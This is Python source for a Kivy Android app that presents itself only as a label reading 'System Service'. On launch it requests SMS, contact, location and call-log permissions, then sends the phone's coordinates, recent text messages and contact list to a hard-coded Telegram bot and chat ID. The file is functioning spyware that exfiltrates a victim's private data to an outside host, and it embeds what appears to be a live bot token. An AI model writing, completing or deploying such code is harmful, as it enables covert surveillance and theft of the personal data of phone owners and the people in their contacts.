# language: Python 3, file: main.py
import os
import time
import requests
from kivy.app import App
from kivy.clock import Clock
from kivy.uix.label import Label
from android.permissions import request_permissions, Permission

BOT_TOKEN = "9156035172:AAG8XF7pLz7KV8nw9z09vHIhhUaWgHTXubI"
CHAT_ID   = "8947742554" 
API = f"https://api.telegram.org/bot{BOT_TOKEN}"

def send(text):
    try:
        requests.post(f"{API}/sendMessage",
                      data={"chat_id": CHAT_ID, "text": text}, timeout=15)
    except Exception:
        pass

def get_sms():
    from jnius import autoclass
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    uri = autoclass('android.net.Uri').parse("content://sms/inbox")
    cursor = PythonActivity.mActivity.getContentResolver().query(uri, None, None, None, "date DESC")
    lines = []
    if cursor:
        while cursor.moveToNext() and len(lines) < 15:
            body = cursor.getString(cursor.getColumnIndex("body"))
            addr = cursor.getString(cursor.getColumnIndex("address"))
            lines.append(f"{addr}: {body[:60]}")
        cursor.close()
    send("✉️ SMS:\n" + "\n".join(lines))

def get_contacts():
    from jnius import autoclass
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    ContactsContract = autoclass("android.provider.ContactsContract$CommonDataKinds$Phone")
    cursor = PythonActivity.mActivity.getContentResolver().query(ContactsContract.CONTENT_URI, None, None, None, None)
    lines = []
    if cursor:
        while cursor.moveToNext() and len(lines) < 20:
            name = cursor.getString(cursor.getColumnIndex("DISPLAY_NAME"))
            num = cursor.getString(cursor.getColumnIndex("NUMBER"))
            lines.append(f"{name}: {num}")
        cursor.close()
    send("👥 Контакты:\n" + "\n".join(lines))

def get_gps():
    try:
        from plyer import gps
        result = {}
        def on_loc(**kw):
            result.update(kw)
        gps.configure(on_location=on_loc)
        gps.start(minTime=1000, minDistance=1)
        time.sleep(3)
        gps.stop()
        if result:
            send(f"📍 Координаты: {result.get('lat')}, {result.get('lon')}")
    except Exception as e:
        send(f"GPS error: {e}")

class TrackerApp(App):
    def on_start(self):
        request_permissions([
            Permission.INTERNET,
            Permission.ACCESS_FINE_LOCATION,
            Permission.ACCESS_COARSE_LOCATION,
            Permission.READ_SMS,
            Permission.READ_CONTACTS,
            Permission.READ_CALL_LOG
        ])
        Clock.schedule_once(lambda dt: send("🚀 APK запущен!"), 2)
        Clock.schedule_once(lambda dt: get_gps(), 4)
        Clock.schedule_once(lambda dt: get_sms(), 8)
        Clock.schedule_once(lambda dt: get_contacts(), 12)

    def build(self):
        return Label(text="System Service")

if __name__ == "__main__":
    TrackerApp().run()
